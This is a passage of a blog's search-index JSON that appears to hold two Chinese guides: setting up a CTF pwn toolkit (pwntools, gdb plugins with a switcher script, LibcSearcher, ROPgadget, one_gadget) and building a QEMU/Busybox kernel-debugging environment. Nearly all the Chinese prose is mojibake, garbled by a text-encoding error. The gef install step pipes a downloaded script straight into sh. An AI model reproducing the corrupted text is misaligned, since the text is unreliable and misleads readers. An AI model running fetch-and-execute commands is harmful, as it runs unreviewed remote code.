Pwnç¯å¢ƒæ­å»º","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"Linuxå¹³å°ä¸‹çš„CTF Pwnç¯å¢ƒæ­å»º ","date":"2020-12-25","objectID":"/2020/12/pwn/:0:0","tags":["pwn"],"title":"Linuxå¹³å°ä¸‹çš„CTF Pwnç¯å¢ƒæ­å»º","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"å‰è¨€ æœ€è¿‘é‡åˆ°å¾ˆå¤šäººæƒ³ç©CTFï¼Œå’¨è¯¢ç¯å¢ƒé—®é¢˜ã€‚ä¸ºäº†æ›´å¥½åœ°å°†ç ”ç©¶é‡å¿ƒæ”¾åœ¨æŠ€æœ¯æœ¬èº«ï¼Œè¿™é‡Œç®€å•æ•´ç†ä¸€ä¸‹ä¸ªäººçš„Pwnç¯å¢ƒçš„æ­å»ºè¿‡ç¨‹ï¼Œä»…ä¾›å‚è€ƒã€‚ ","date":"2020-12-25","objectID":"/2020/12/pwn/:1:0","tags":["pwn"],"title":"Linuxå¹³å°ä¸‹çš„CTF Pwnç¯å¢ƒæ­å»º","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"ä¸€ã€æ“ä½œç³»ç»Ÿé€‰æ‹© å› ä¸ºæ˜¯Pwnç¯å¢ƒï¼Œæ¶‰åŠåˆ°Windowså¹³å°çš„æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨Linuxæˆ–è€…MacOSã€‚æˆ‘ä¸ªäººæ˜¯ä¸€å¥—Linuxçš„è™šæ‹Ÿç¯å¢ƒæ­é…MacOSçš„ç‰©ç†ç¯å¢ƒï¼ŒåŸºæœ¬èƒ½é€‚åº”æ‰€æœ‰çš„Pwnç¯å¢ƒè¦æ±‚ã€‚ ç‰©ç†ç¯å¢ƒï¼šMBP 2015 è™šæ‹Ÿç¯å¢ƒï¼šUbuntu 18.04 éœ€è¦æ³¨æ„ï¼ŒLinuxçš„ç‰ˆæœ¬å¤ªé«˜å¾ˆå¤šæ’ä»¶å®¹æ˜“å‡ºé—®é¢˜ï¼Œæ‰€ä»¥ä¸å»ºè®®ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„Linuxç³»ç»Ÿï¼Œæœ€ç¨³å®šçš„ä¸æ˜¯å¤ªè€æ—§çš„å°±å¯ä»¥ã€‚æ­¤å¤–ï¼Œç¯å¢ƒå› äººè€Œå¼‚ï¼Œæ²¡æœ‰æ¨¡æ¿ï¼Œä¸æ˜¯å›ºå®šçš„ï¼ŒæŒ‰éœ€åˆ†é…ã€‚ ","date":"2020-12-25","objectID":"/2020/12/pwn/:2:0","tags":["pwn"],"title":"Linuxå¹³å°ä¸‹çš„CTF Pwnç¯å¢ƒæ­å»º","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"äºŒã€å¿…å¤‡ä¸€èˆ¬è½¯ä»¶ vimï¼šä¸ªäººå¿…å¤‡ï¼Œå¼ºçƒˆå»ºè®®å­¦ä¹ ä¸€ç‚¹vimçš„ç›¸å…³çŸ¥è¯†ï¼Œå¯ä»¥æé«˜æ•ˆç‡ï¼Œé¿å…å®‰è£…è¿‡å¤šçš„ç¼–è¾‘å™¨æˆ–è€…IDE gitï¼šå¿…å¤‡ï¼Œå¾ˆå¤šé«˜æ•ˆçš„æ’ä»¶éƒ½æ˜¯æ”¾åœ¨GitHubä¸Šçš„ pythonï¼šå¿…å¤‡ï¼Œå»ºè®®python3ï¼Œæ¯•ç«Ÿpython2å·²ç»ä¸æ”¯æŒäº† pipï¼šå¿…å¤‡ï¼Œæœ‰ä¸€äº›æ’ä»¶éœ€è¦ä½¿ç”¨pipè¿›è¡Œå®‰è£… ä¸€æ¬¾ç¼–è¾‘å™¨ï¼šè¿™ä¸ªçœ‹ä¸ªäººéœ€æ±‚ï¼Œvscodeã€sublime textç­‰ï¼Œä¸ªäººå–œæ¬¢å°±å¥½ã€‚å¦‚æœæœ‰æ¡ä»¶çš„è¯ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸‹é…ç½®ï¼Œå½“ä½œä¸€ä¸ªç®€å•çš„å¼€å‘IDEä½¿ç”¨ï¼Œæ¯•ç«ŸPwnç¯å¢ƒä¸­å¼€å‘çš„ä»£ç ä¸ä¼šå¾ˆå¤šã€‚ ä»¥ä¸Šå„è½¯ä»¶æ ¹æ®å®˜æ–¹æ–‡æ¡£è‡ªè¡Œå®‰è£…å³å¯ã€‚ ","date":"2020-12-25","objectID":"/2020/12/pwn/:3:0","tags":["pwn"],"title":"Linuxå¹³å°ä¸‹çš„CTF Pwnç¯å¢ƒæ­å»º","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"ä¸‰ã€Pwnå¸¸ç”¨è½¯ä»¶ æ¶‰åŠåˆ°çš„å„ç§è½¯ä»¶çš„å®‰è£…ï¼Œå‡ä»¥Ubuntuå¹³å°ä¸ºä¾‹ pwntools ä¸€ä¸ªctfæ¡†æ¶å’Œæ¼æ´åˆ©ç”¨å¼€å‘åº“ï¼Œç”¨pythonå¼€å‘,å¿…å¤‡ç¥å™¨ï¼Œä½œç”¨ä¸å¤šè§£é‡Šã€‚ å®‰è£…æ–¹æ³•ï¼š $ apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential $ pip install -U setuptools $ pip install --upgrade pip $ pip install --upgrade pwntools ä¸ªäººä½¿ç”¨çš„æ˜¯python2ç‰ˆæœ¬ï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚pwntoolsç°åœ¨æ”¯æŒpython3äº†ï¼Œè¿™é‡Œç»™å‡ºGitHubåœ°å€ï¼Œæœ‰éœ€è¦çš„å¯ä»¥å‚è€ƒå…¶readmeè¿›è¡Œå®‰è£…python3çš„pwntoolsã€‚ æ”¯æŒpython3çš„pwntools å®‰è£…å®Œæˆåï¼Œæ‰“å¼€pythonæµ‹è¯•, æ‰§è¡Œfrom pwn import *ä¸ä¼šæŠ¥é”™å³å¯ã€‚ ï¼ˆå¤‡æ³¨ï¼šåœ¨macå¹³å°ä¸‹ä¸è¦ä½¿ç”¨pipå®‰è£…ï¼Œä½ ä¼šæ€€ç–‘äººç”Ÿçš„ï¼Œä½¿ç”¨homebrewå®‰è£…ï¼‰ gdb åŠ¨æ€è°ƒè¯•è½¯ä»¶ï¼Œå¿…å¤‡ã€‚ å®‰è£…æ–¹æ³•ï¼š apt-get install gdb peda/pwngdb/gef è¿™æ˜¯å¸¸è§çš„gdbçš„ä¸‰ä¸ªæ’ä»¶ï¼Œé…åˆgdbä½¿ç”¨å¯ä»¥æå‡è°ƒè¯•æ•ˆç‡ã€‚ å®‰è£…pwndbgï¼š git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh å®‰è£…pedaï¼š git clone https://github.com/longld/peda.git~/peda echo \"source ~/peda/peda.py\" \u003e\u003e ~/.gdbinit å®‰è£…gefï¼š wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh| sh wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.py echo source ~/.gdbinit-gef.py \u003e\u003e ~/.gdbinit å› ä¸ºåœ¨åŒä¸€æ—¶åˆ»åªèƒ½ä½¿ç”¨ä¸€ç§æ’ä»¶ï¼Œè€Œä¸”åœ¨è§£å†³ä¸åŒç±»å‹çš„é¢˜ç›®æ—¶ä½¿ç”¨ä¸åŒçš„æ’ä»¶ï¼Œå› æ­¤éœ€è¦é…ç½®ä¸‰ç§æ’ä»¶çš„å¿«æ·åˆ‡æ¢ã€‚ é¦–å…ˆï¼Œgdbä½¿ç”¨å“ªç§æ’ä»¶æ˜¯åœ¨.gdbinitæ–‡ä»¶ï¼ˆä¸€èˆ¬åœ¨rootç›®å½•ä¸‹ï¼‰ä¸­ä½¿ç”¨sourceè¿›è¡Œæ§åˆ¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨æ’ä»¶æ—¶æ³¨é‡Šæ‰å…¶ä»–çš„sourceå‘½ä»¤ï¼Œå³å¯å•ç‹¬ä½¿ç”¨æŸä¸€æ’ä»¶ã€‚ä½†æ˜¯æ¯æ¬¡éƒ½ç¼–è¾‘è¯¥æ–‡ä»¶å®åœ¨æ˜¯éº»çƒ¦ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è„šæœ¬è¿›è¡Œé€‰æ‹©ã€‚ #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit #è¿™ä¸ªè·¯å¾„æŒ‰ç…§ä½ çš„å®é™…æƒ…å†µä¿®æ”¹ # gdbinitfile=/root/Desktop/mode peda=\"source ~/peda/peda.py\" #è¿™ä¸ªè·¯å¾„æŒ‰ç…§ä½ çš„å®é™…æƒ…å†µä¿®æ”¹ gef=\"source ~/.gdbinit-gef.py\" #è¿™ä¸ªè·¯å¾„æŒ‰ç…§ä½ çš„å®é™…æƒ…å†µä¿®æ”¹ pwndbg=\"source /opt/pwndbg/gdbinit.py\" #è¿™ä¸ªè·¯å¾„æŒ‰ç…§ä½ çš„å®é™…æƒ…å†µä¿®æ”¹ sign=$(cat $gdbinitfile | grep -n \"#this place is controled by user's shell\") #æ­¤å¤„ä¸Šé¢çš„æŸ¥æ‰¾å†…å®¹è¦å’Œä½ è‡ªå·±çš„ä¿æŒä¸€è‡´ pattern=\":#this place is controled by user's shell\" number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\"TEST\" if [ $name -eq \"1\" ];then sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add $peda\" $gdbinitfile echo -e \"Please enjoy the peda!\\n\" elif [ $name -eq \"2\" ];then sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add $gef\" $gdbinitfile echo -e \"Please enjoy the gef!\\n\" else sed -i \"$parameter_del\" $gdbinitfile sed -i \"$parameter_add $pwndbg\" $gdbinitfile echo -e \"Please enjoy the pwndbg!\\n\" fi } echo -e \"Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\" read -p \"Input your choice:\" num if [ $num -eq \"1\" ];then Mode_change $num elif [ $num -eq \"2\" ];then Mode_change $num elif [ $num -eq \"3\" ];then Mode_change $num else echo -e \"Error!\\nPleasse input right number!\" fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9 ç°åœ¨æˆ‘ä»¬æŠŠè¿™ä¸ªshellè„šæœ¬æ”¾åˆ°ä¸€ä¸ªç¯å¢ƒå˜é‡æŒ‡å‘çš„è·¯å¾„é‡Œé¢ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è‡ªå·±çš„è·¯å¾„ï¼Œshellè„šæœ¬æ”¾è¿›å» echo $PATH æˆ‘æ”¾åœ¨äº†/usr/local/sbinç›®å½•ä¸‹ï¼Œè¿™æ ·å°±å¯ä»¥æ‰§è¡Œ gdb.shï¼Œè¾“å…¥å¯¹åº”æ’ä»¶çš„æ•°å­—å°±å¯ä»¥é€‰æ‹©ä½¿ç”¨å“ªä¸ªæ’ä»¶ï¼Œæ— éœ€æ‰‹åŠ¨æ›´æ”¹.gdbinitæ–‡ä»¶ã€‚ å®åœ¨ä¸ä¼šå¯ä»¥å‚è€ƒè¿™ä½å¸ˆå‚…çš„æ•™ç¨‹ï¼šè‡ªåŠ¨é€‰æ‹©gdbæ’ä»¶ 32ä½ç¨‹åºæ”¯æŒ å¿…å¤‡ï¼Œè£…å®ƒã€‚ apt-get install libc6-dev-i386 qemu è¿™æ˜¯armçš„pwnç¯å¢ƒï¼Œå‰æœŸå¯ä»¥ä¸å®‰è£…ï¼Œä½†æ˜¯ç»ˆç©¶æ˜¯é€ƒä¸è¿‡çš„ï¼Œå»ºè®®ä¸€æ­¥åˆ°ä½ã€‚ å®‰è£…qemuï¼š sudo apt-get install qemu sudo apt-get install qemu-system qemu-user-static binfmt-support å®‰è£…ä¾èµ–åº“ï¼š sudo apt-get install -y gcc-arm-linux-gnueabi sudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git LibcSearcher æ³„éœ²libcåº“ä¸­å‡½æ•°çš„åç§»çš„åº“ï¼Œå»ºè®®å®‰è£…ï¼Œå¯ä»¥èŠ‚çœæ—¶é—´ï¼Œæé«˜æ•ˆç‡ã€‚ å®‰è£…LibcSearcherï¼š sudo pip install capstone git clone https://github.com/lieanu/LibcSearcher.git cd LibcSearcher python setup.py develop ROPgadgetå’Œone_gadget ROPgadgetæ˜¯ç”¨æ¥æ‰¾gadgetçš„ï¼Œone_gadgetç”¨æ¥å¯»æ‰¾libcåº“ä¸­çš„execve(â€™/bin/shâ€™, NULL, NULL)å¯ä»¥ä¸€ä¸ªgadgetå°±å¯ä»¥getshellï¼Œå»ºè®®å®‰è£…ã€‚ å®‰è£…ROPgadgetï¼š # å…ˆå®‰è£…Capstone,å®ƒæ˜¯ä¸€ä¸ªè½»é‡çº§çš„å¤šå¹³å°æ¶æ„æ”¯æŒçš„åæ±‡ç¼–æ¶æ„ã€‚ sudo apt-get install python-capstone ç„¶åï¼Œä¸‹è½½å¥½ROPgadgetè§£å‹è¿›å…¥æ–‡ä»¶å¤¹ä¸­ python setup.py install å®‰è£…one_gadgetï¼š sudo apt install ruby gem install one_gadget IDA é™æ€è°ƒè¯•å¿…å¤‡ï¼Œä¸å¤šè§£é‡Šã€‚è¿™é‡Œå»ºè®®å®‰è£…52ä¸Šçš„ç‰ˆæœ¬ï¼š 52ä¸Šçš„IDA ","date":"2020-12-25","objectID":"/2020/12/pwn/:4:0","tags":["pwn"],"title":"Linuxå¹³å°ä¸‹çš„CTF Pwnç¯å¢ƒæ­å»º","uri":"/2020/12/pwn/"},{"categories":["CTF"],"content":"å››ã€æ€»ç»“ æ•´ç†è¿™ç¯‡æ–‡ç« çš„ç›®çš„æ˜¯å¸Œæœ›åœ¨ç©Pwnçš„æ—¶å€™å¯ä»¥ä¸ç”¨èŠ±å¤ªå¤šæ—¶é—´åœ¨ç¯å¢ƒä¸Šï¼Œæ­é…å¥½ä¸€å¥—ç¯å¢ƒä¸€ç›´ç”¨å°±å¥½äº†ï¼Œæ ¹æ®å…·ä½“æƒ…å†µå†è¿›è¡Œè¡¥å……ã€‚è¿˜æ˜¯é‚£å¥è¯ï¼Œé‡å¿ƒè¿˜æ˜¯è¦æ”¾åœ¨æŠ€æœ¯æœ¬èº«ä¸Šã€‚ ","date":"2020-12-25","objectID":"/2020/12/pwn/:5:0","tags":["pwn"],"title":"Linuxå¹³å°ä¸‹çš„CTF Pwnç¯å¢ƒæ­å»º","uri":"/2020/12/pwn/"},{"categories":["Misc"],"content":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","date":"2020-12-24","objectID":"/2020/12/qemu/","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ ","date":"2020-12-24","objectID":"/2020/12/qemu/:0:0","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"å‰è¨€ æœ€è¿‘è½¬Linuxå¹³å°ï¼Œå¼€å§‹æ·±å…¥Linuxå†…æ ¸ç›¸å…³ï¼Œæ€»ç»“ä¸€ä¸‹è¿›è¡ŒLinuxå†…æ ¸ç¯å¢ƒæ¨¡æ‹Ÿæµç¨‹ã€‚ç»“åˆLinuxçš„å†…æ ¸æºç ä¸€èµ·ï¼Œæ•ˆæœä¼šæ¯”è¾ƒå¥½ã€‚ ","date":"2020-12-24","objectID":"/2020/12/qemu/:1:0","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"å‡†å¤‡ç¯å¢ƒ ","date":"2020-12-24","objectID":"/2020/12/qemu/:2:0","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"ä¸»æœºç¯å¢ƒ Ubuntu 18.04 Linux ubuntu 5.4.0-58-generic #64~18.04.1-Ubuntu SMP Wed Dec 9 17:11:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux ","date":"2020-12-24","objectID":"/2020/12/qemu/:2:1","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"éœ€è¦ä½¿ç”¨çš„è½¯ä»¶ ä½¿ç”¨ä¸»æµçš„qemu+busyboxè¿›è¡Œæ¨¡æ‹Ÿï¼Œåº•å±‚çš„æ¨¡æ‹Ÿå®ç°è½¯ä»¶å†…éƒ¨å®Œæˆï¼Œå¯ä»¥å°†é‡å¿ƒæ”¾åœ¨å†…æ ¸è°ƒè¯•ä¸Šï¼Œé¿å…åœ¨ç¯å¢ƒä¸Šæµªè´¹è¿‡å¤šæ—¶é—´ã€‚qemuæ¨¡æ‹Ÿå™¨åŸç”Ÿå³æ”¯æŒgdbè°ƒè¯•å™¨ï¼Œæ‰€ä»¥å¯ä»¥æ–¹ä¾¿åœ°ä½¿ç”¨gdbçš„å¼ºå¤§åŠŸèƒ½å¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œè°ƒè¯•ã€‚ é¦–å…ˆå®‰è£…qemuï¼Œä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š sudo apt-get install qemu sudo apt-get install qemu-system sudo apt-get install qemu-user-static è¿™é‡Œä¸å»ºè®®ä½¿ç”¨æºç ç¼–è¯‘çš„æ–¹å¼è¿›è¡Œå®‰è£…ï¼Œä¸ªäººå»ºè®®æ˜¯èŠ‚çœæ—¶é—´åœ¨æ ¸å¿ƒå·¥ä½œä¸Šï¼Œå·¥å…·è¶Šå¿«æ­å»ºå¥½è¶Šèƒ½æå‡æ•ˆç‡ã€‚æºç ç¼–è¯‘æ¶‰åŠåˆ°ç¼–è¯‘å™¨å’Œä¸»æœºç¯å¢ƒå„å¼‚æ€§çš„é—®é¢˜ï¼Œä¸­é—´å¯èƒ½å‡ºç°å„ç§æƒ…å†µï¼Œæµªè´¹æ—¶é—´ã€‚ï¼ˆæ³¨æ„ï¼Œå®‰è£…å¥½åï¼Œæ— æ³•ç›´æ¥qemuæ— æ³•è¿è¡Œï¼Œéœ€è¦ä½¿ç”¨qemu-system-i386, qemu-system-x86_64, qemu-system-armè¿™ç§æ ¼å¼çš„å‘½ä»¤è¿›è¡Œè¿è¡Œã€‚å¦‚æœå«Œéº»çƒ¦ï¼Œå¯ä»¥è®¾ç½®è½¯é“¾æ¥ã€‚ï¼‰ å®‰è£…busyboxï¼Œç›´æ¥busyboxçš„githubä¸Šæ‹–æºç ä¸‹æ¥å³å¯ã€‚åœ¨å®é™…è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿåˆ¶ä½œçš„æ—¶å€™å†è¿›è¡Œå…¶ä»–æ“ä½œã€‚ æœ€åæ˜¯ä¸‹è½½æƒ³è¿›è¡Œç¼–è¯‘çš„Linuxå†…æ ¸æºç ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªå„ä¸ªç‰ˆæœ¬çš„Linuxå†…æ ¸æºç é›†åˆã€‚ ","date":"2020-12-24","objectID":"/2020/12/qemu/:2:2","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"ç¼–è¯‘è°ƒè¯•ç‰ˆå†…æ ¸ ","date":"2020-12-24","objectID":"/2020/12/qemu/:3:0","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"ç¼–è¯‘æ­£å¸¸æµç¨‹ é¦–å…ˆå¯¹Linuxå†…æ ¸è¿›è¡Œç¼–è¯‘ï¼š cd linux-3.18.6 make menuconfig make bzImage æ³¨æ„ï¼Œè¿™é‡Œåœ¨è¿›å…¥menuconfigåï¼Œéœ€è¦å¼€å¯å†…æ ¸å‚æ•°CONFIG_DEBUG_INFOå’ŒCONFIG_GDB_SCRIPTSã€‚gdbæä¾›äº†pythonæ¥å£è¿›è¡ŒåŠŸèƒ½æ‰©å±•ï¼Œå†…æ ¸åŸºäºpythonæ¥å£å®ç°äº†ä¸€ç³»åˆ—è¾…åŠ©è„šæœ¬æ¥ç®€åŒ–å†…æ ¸çš„è°ƒè¯•è¿‡ç¨‹ã€‚ Kernel hacking ---\u003e [*] Kernel debugging Compile-time checks and compiler options ---\u003e [*] Compile the kernel with debug info [*] Provide GDB scripts for kernel debuggin ","date":"2020-12-24","objectID":"/2020/12/qemu/:3:1","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"ç¼–è¯‘å¯èƒ½é‡åˆ°çš„é—®é¢˜ æ‰§è¡Œmake bzImageæ—¶é‡åˆ°çš„é—®é¢˜ï¼š fatal error: linux/compiler-gcc7.h: No such file or directory æç¤ºç¼ºå°‘compiler-gcc7.hè¿™ä¸ªæ–‡ä»¶ï¼Œæ˜¯ç”±äºå†…æ ¸ç‰ˆæœ¬è¾ƒä½å’Œgccç‰ˆæœ¬ä¸åŒ¹é…é€ æˆçš„æœ‰ä¸‰ç§è§£å†³æ–¹æ³•ï¼š 1.åœ¨å†…æ ¸æ–‡ä»¶å¤¹ä¸­include/linuxç›®å½•ä¸‹æ‰¾åˆ°compiler-gcc4.hæ–‡ä»¶ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¯èƒ½ä¸ä¸€æ ·ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯compiler-gcc3.h,å°†å®ƒé‡å‘½åä¸ºcompiler-gcc7.hã€‚ç„¶åé‡æ–°ç¼–è¯‘ä¸€ä¸‹å°±å¥½äº†ã€‚ 2.åœ¨æ–°çš„å†…æ ¸æºç ä¸­æ‹·è´ä¸€ä¸ªcompiler-gcc7.hï¼Œå°†å®ƒæ‹·è´åˆ°å†…æ ¸æ–‡ä»¶å¤¹include/linuxç›®å½•ä¸‹ï¼Œé‡æ–°ç¼–è¯‘å³å¯ã€‚ 3.é‡è£…ä¸€ä¸ªç‰ˆæœ¬ä½ä¸€ç‚¹çš„gccã€‚ fatal error: asm/types.h: No such file or directory linuxæ·»åŠ åˆ°asm-genericçš„è½¯é“¾æ¥: ln -s /usr/include/asm-generic asm ","date":"2020-12-24","objectID":"/2020/12/qemu/:3:2","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"åˆ¶ä½œinitramfsæ ¹æ–‡ä»¶ç³»ç»Ÿ Linuxå¯åŠ¨é˜¶æ®µï¼Œboot loaderåŠ è½½å®Œå†…æ ¸æ–‡ä»¶vmlinuzä¹‹åï¼Œä¾¿å¼€å§‹æŒ‚è½½ç£ç›˜æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚æŒ‚è½½æ“ä½œéœ€è¦ç£ç›˜é©±åŠ¨ï¼Œæ‰€ä»¥æŒ‚è½½å‰è¦å…ˆåŠ è½½é©±åŠ¨ã€‚ä½†æ˜¯é©±åŠ¨ä½äº/lib/modulesï¼Œä¸æŒ‚è½½ç£ç›˜å°±è®¿é—®ä¸åˆ°ï¼Œå½¢æˆäº†ä¸€ä¸ªæ­»å¾ªç¯ã€‚initramfsæ ¹æ–‡ä»¶ç³»ç»Ÿå°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…¶ä¸­åŒ…å«å¿…è¦çš„è®¾å¤‡é©±åŠ¨å’Œå·¥å…·ï¼Œboot loaderä¼šåŠ è½½initramfsåˆ°å†…å­˜ä¸­ï¼Œå†…æ ¸å°†å…¶æŒ‚è½½åˆ°æ ¹ç›®å½•ï¼Œç„¶åè¿è¡Œ/initåˆå§‹åŒ–è„šæœ¬ï¼Œå»æŒ‚è½½çœŸæ­£çš„ç£ç›˜æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚ ","date":"2020-12-24","objectID":"/2020/12/qemu/:4:0","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"ç¼–è¯‘busybox é¦–å…ˆéœ€è¦æ³¨æ„ï¼Œbusyboxé»˜è®¤ç¼–è¯‘çš„æ–‡ä»¶ç³»ç»Ÿæ˜¯å’Œä¸»æœºOSä¸€æ ·çš„ä½æ•°ï¼Œä¹Ÿå°±æ˜¯Ubuntuæ˜¯x86çš„ï¼Œç¼–è¯‘å‡ºçš„æ–‡ä»¶ç³»ç»Ÿå°±æ˜¯x86çš„ï¼Œå¦‚æœUbuntuæ˜¯x64çš„ï¼Œç¼–è¯‘å‡ºçš„æ–‡ä»¶ç³»ç»Ÿæ˜¯x64çš„ã€‚è¦ä¿æŒå‰é¢ç¼–è¯‘çš„Linuxå†…æ ¸å’Œæ–‡ä»¶ç³»ç»Ÿçš„ä½æ•°ä¸€æ ·ã€‚ cd busybox-1.32.0 make menuconfig make -j 20 make install è¿›å…¥menuåï¼Œä¿®æ”¹å‚æ•°å¦‚ä¸‹ï¼š å…¶æ¬¡ï¼Œä¿®æ”¹ä¸ºé™æ€é“¾æ¥ï¼š Settings ---\u003e [*] Build static binary (no shared libs) ç„¶åå†æ‰§è¡Œmakeå’Œinstallæ“ä½œã€‚ ","date":"2020-12-24","objectID":"/2020/12/qemu/:4:1","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"åˆ›å»ºinitramfs ç¼–è¯‘æˆåŠŸåï¼Œä¼šç”Ÿæˆ_installç›®å½•ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š $ ls _install bin linuxrc sbin usr ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š mkdir initramfs cd initramfs cp ../_install/* -rf ./ mkdir dev proc sys sudo cp -a /dev/{null, console, tty, tty1, tty2, tty3, tty4} dev/ rm linuxrc vim init chmod a+x init å…¶ä¸­initæ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š #!/bin/busybox sh mount -t proc none /proc mount -t sysfs none /sys exec /sbin/init åœ¨åˆ›å»ºçš„initramfsä¸­åŒ…å«busyboxå¯æ‰§è¡Œç¨‹åºã€å¿…é¡»çš„è®¾å¤‡æ–‡ä»¶ã€å¯åŠ¨è„šæœ¬initï¼Œä¸”initåªæŒ‚è½½äº†è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿprocfså’Œsysfsï¼Œæ²¡æœ‰æŒ‚è½½ç£ç›˜æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œæ‰€æœ‰æ“ä½œéƒ½åœ¨å†…å­˜ä¸­è¿›è¡Œï¼Œä¸ä¼šè½åœ°ã€‚ æœ€åæ‰“åŒ…initramfsï¼š find . -print0 | cpio --null -ov --format=newc | gzip -9 \u003e ../initramfs.cpio.gz ","date":"2020-12-24","objectID":"/2020/12/qemu/:4:2","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Misc"],"content":"å¯åŠ¨å†…æ ¸ qemu-system-i386 -s -kernel /path/to/bzImage -initrd initramfs.cpio.gz -nographic -append \"console=ttyS0\" å‚æ•°è¯´æ˜ï¼š -sæ˜¯-gdb tcp::1234ç¼©å†™ï¼Œç›‘å¬1234ç«¯å£ï¼Œåœ¨GDBä¸­å¯ä»¥é€šè¿‡target remote localhost:1234è¿æ¥ï¼› -kernelæŒ‡å®šç¼–è¯‘å¥½çš„è°ƒè¯•ç‰ˆå†…æ ¸ï¼› -initrdæŒ‡å®šåˆ¶ä½œçš„initramfs; -nographicå–æ¶ˆå›¾å½¢è¾“å‡ºçª—å£ï¼› append \"console=ttyS0\"å°†è¾“å‡ºé‡å®šå‘åˆ°consoleï¼Œå°†ä¼šæ˜¾ç¤ºåœ¨æ ‡å‡†è¾“å‡ºstdioã€‚ å¯åŠ¨åçš„æ ¹ç›®å½•ï¼Œå°±æ˜¯initramfsä¸­åŒ…å«çš„å†…å®¹ï¼š è‡³æ­¤ï¼Œä¸€ä¸ªç®€å•çš„å†…æ ¸å°±ç®—ç¼–è¯‘å®Œæˆäº†ï¼Œå¯ä»¥æŒ‚gdbè¿›è¡Œè°ƒè¯•äº†ã€‚ ","date":"2020-12-24","objectID":"/2020/12/qemu/:5:0","tags":["Linux"],"title":"QEMU + Busybox æ¨¡æ‹Ÿ Linux å†…æ ¸ç¯å¢ƒ","uri":"/2020/12/qemu/"},{"categories":["Fuzz"],"content":"Fuzzing 101 ç³»åˆ— note 5","date":"2020-12-17","objectID":"/2020/12/fuzzing101-5/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 